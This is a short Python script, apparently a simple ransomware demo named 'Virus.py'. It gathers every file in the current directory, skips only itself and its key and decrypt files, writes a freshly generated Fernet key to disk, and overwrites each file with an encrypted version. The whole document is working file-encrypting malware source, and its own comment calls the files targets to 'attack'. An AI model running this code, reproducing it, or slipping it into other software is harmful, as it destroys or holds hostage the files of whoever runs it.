import os
from cryptography.fernet import Fernet

Files = []

for file in os.listdir():

    # It show all file which we have to attack except Virus.py
    if file == "Virus.py" or file == "Security Key.key" or file == "Virus Decrypt.py":
        continue

    # For Removing Directory
    if os.path.isfile(file): 
        Files.append(file)

print(Files)

# Generate key
key = Fernet.generate_key()
print(key)

# Store generated Key in File
with open("Security Key.key", "wb") as k:
    k.write(key)

for file in Files:
    with open(file, "rb") as theFile:
        content = theFile.read()
    encrypted_content = Fernet(key).encrypt(content)

    with open(file, "wb") as theFile:
        theFile.write(encrypted_content)